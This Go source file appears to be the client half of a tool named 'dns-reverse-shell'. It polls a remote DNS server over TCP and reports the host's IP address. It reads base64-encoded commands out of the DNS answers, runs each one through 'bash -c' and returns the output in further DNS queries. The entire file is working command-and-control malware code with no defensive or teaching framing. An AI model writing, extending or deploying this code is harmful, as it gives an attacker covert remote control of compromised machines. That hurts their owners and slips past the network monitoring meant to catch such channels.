package client

import (
	"dns-reverse-shell/main/protocol"
	"dns-reverse-shell/main/protocol/encoder"
	"fmt"
	"github.com/miekg/dns"
	"os/exec"
)

type DNSClient struct {
	address        string
	client         *dns.Client
	idleCounter    int
	messageHandler *protocol.MessageHandler
	commandHandler protocol.CommandHandler
}

func NewDNSClient(address string) *DNSClient {
	client := new(dns.Client)
	client.Net = "tcp"
	msgHandler := protocol.NewMessageHandler(encoder.NewBase64Encoder(), protocol.NewSimpleMessageSplitter())
	clientCommandHandler := newClientCommandHandler()
	return &DNSClient{address: address, client: client, messageHandler: msgHandler, commandHandler: clientCommandHandler}
}

func (d DNSClient) Start() {
	for {
		d.commandHandler.Poll(d.poll)
	}
}

func (d DNSClient) sendMessage(commandType string, message string) {
	msg := d.messageHandler.CreateQuestionMessage(commandType, message)
	in, _, err := d.client.Exchange(msg, d.address)
	if err != nil {
		fmt.Println(err)
	} else {
		d.handleAnswer(in)
	}
}

func (d DNSClient) handleAnswer(answerMsg *dns.Msg) {
	msg := d.messageHandler.DecodeAnswerMsg(answerMsg)
	if msg == "" {
		return
	}
	fmt.Println(msg)
	d.commandHandler.HandleCommand(msg, d.poll, d.answerCallback, d.exitCallback)
}

func (d DNSClient) poll() {
	ipAddr := d.executeCommand("hostname -I | cut -d' ' -f2")
	d.sendMessage("poll", ipAddr)
}

func (d DNSClient) answerCallback(message string) {
	d.sendMessage("answer", message)
}

func (d DNSClient) exitCallback() {
	d.sendMessage("exit", "exit")
}

func (d DNSClient) executeCommand(command string) string {
	cmd := exec.Command("bash", "-c", command)
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println(err)
		return "command execution failed: " + err.Error()
	}
	return string(output)
}
